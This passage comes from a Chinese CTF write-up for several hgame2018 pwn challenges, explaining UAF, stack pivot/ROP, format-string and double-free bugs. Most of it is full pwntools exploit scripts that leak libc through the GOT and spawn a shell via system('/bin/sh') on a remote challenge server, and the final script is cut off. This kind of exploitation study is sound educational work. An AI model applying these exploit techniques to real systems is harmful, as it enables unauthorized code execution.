<p>利用UAF漏洞可以很容易的控制程序执行流程：</p>
<p>先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./message_saver'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./message_saver'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x400C64'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10011</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==='</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x40084D</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'\0\0\0'</span>+p64(<span class="number">0x00</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">tmp = p.recvuntil(<span class="string">'\n=='</span>)</span><br><span class="line">addr = tmp[<span class="number">-9</span>:<span class="number">-3</span>]</span><br><span class="line">puts_addr = u64(addr.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x18</span>))</span><br><span class="line">p.recvuntil(<span class="string">'message:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+p64(elf.got[<span class="string">'puts'</span>])+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="LEVEL-WEEK-4"><a href="#LEVEL-WEEK-4" class="headerlink" title="LEVEL - WEEK 4"></a>LEVEL - WEEK 4</h1><h2 id="ascii-art-market"><a href="#ascii-art-market" class="headerlink" title="ascii_art_market"></a>ascii_art_market</h2><p>题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。</p>
<p><img src="/img/hgame2018/4_1_1.png" alt=""></p>
<p>最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x0400A2B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10012</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">target = <span class="number">0x4009FC</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0x602c00</span>)+p64(target))</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400a91</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400640</span></span><br><span class="line">rop =p64(<span class="number">0xbadbad</span>)+ p64(rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>])+ p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400A2B</span>)</span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)+p64(<span class="number">0x602c00</span><span class="number">-0x80</span>)+p64(<span class="number">0x400A2B</span>)</span><br><span class="line"><span class="comment">#p.send(p64())</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400640 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004009dd : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400541 : ret</span></span><br><span class="line"><span class="string">0x0000000000400980 : ret 0x458b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h2><p>题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。</p>
<p><img src="/img/hgame2018/4_2_1.png" alt=""></p>
<p>存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。</p>
<p>起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。</p>
<p>可以参考置顶日志的libc database使用方法</p>
<p>最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">%7$p  offset</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,base64</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./base64_decoder'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./base64_decoder'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x8048945'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10013</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc6-i386_2.19-0ubuntu6.14_amd64.so'</span>)</span><br><span class="line"><span class="comment">#base64.b64encode(s, altchars=None) </span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(base64.b64encode(<span class="string">'%2$p'</span>))</span><br><span class="line">heap_addr = p.recvline()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,heap_addr</span><br><span class="line">heap_addr_int = int(heap_addr[<span class="number">3</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap addr:'</span>,hex(heap_addr_int)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(heap_addr_int<span class="number">-0x110</span>)+<span class="string">"%%%dc%%%d$hhn"</span>%(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'printf'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] printf addr:'</span>,hex(printf_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = p32(elf.got[<span class="string">'puts'</span>])+<span class="string">"%7$s"</span></span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] puts addr:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system addr:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">target = libc.symbols[<span class="string">'system'</span>] <span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] strcmp@got: '</span>,hex(elf.got[<span class="string">'strcmp'</span>])</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">fmt = fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">'strcmp'</span>]: target&#125;, write_size=<span class="string">'byte'</span>)</span><br><span class="line">p.sendline(base64.b64encode(fmt))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hacker-system-ver3"><a href="#hacker-system-ver3" class="headerlink" title="hacker_system_ver3"></a>hacker_system_ver3</h2><p>函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	   | length     |     name 1     | </span><br><span class="line">0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 2     |     name 3     | </span><br><span class="line">0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | name 4     |       age      | </span><br><span class="line">0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">     | intr addr  |                </span><br><span class="line">0x38 +-+-+-+-+-+-+-</span><br></pre></td></tr></table></figure>
<p>其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。</p>
<p><img src="/img/hgame2018/4_3_1.png" alt=""></p>
<p>但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。</p>
<p>该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。</p>
<p>这里采用了bluecake@dubhe大佬的fastbin利用方法。</p>
<p>劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。</p>
<p>解题的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import time,base64</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./hacker_system_ver3'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)#,'b*0x0400F6D'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72'</span>,<span class="number">10014</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,length,intro)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">'age:'</span>)</span><br><span class="line">	p.sendline(str(age))</span><br><span class="line">	p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">	p.sendline(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_user</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_user</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step 1 leak libc</span></span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step1\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step1'</span>)</span><br><span class="line">add(<span class="string">'nop1\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'1'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">print_user(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="comment">#step 2 leak steak</span></span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step2\n'</span>,<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step2'</span>)</span><br><span class="line">add(<span class="string">'nop2\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,p64(<span class="number">0x18</span>)+<span class="string">'2'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">3</span>)+p64(libc.symbols[<span class="string">'environ'</span>]))</span><br><span class="line">print_user(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line">stack_offset =<span class="number">0x7ffd3af20438</span><span class="number">-0x7ffd3af20330</span></span><br><span class="line"><span class="comment">#add('padding\n',18,0x138,'hack by p4nda')</span></span><br><span class="line"><span class="comment">#delete_user('nop2')</span></span><br><span class="line"><span class="comment">#delete_user('2')</span></span><br><span class="line"><span class="comment">#delete_user()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">add('padding_3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">add('step3\n',18,0x20,'hack by p4nda')</span></span><br><span class="line"><span class="string">delete_user('step3')</span></span><br><span class="line"><span class="string">add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))</span></span><br><span class="line"><span class="string">delete_user('nop3')</span></span><br><span class="line"><span class="string">delete_user('3')</span></span><br><span class="line"><span class="string">delete_user('padding_3')</span></span><br><span class="line"><span class="string">add('ctrl3\n',18,0x38,p64(0xdeadbeef))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line">delete_user(<span class="string">'step3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step3\n'</span>,<span class="number">18</span>,<span class="number">0x70</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line">delete_user(<span class="string">'step4'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400a0f')</span></span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x10</span>+<span class="number">0x08</span>*<span class="number">6</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span 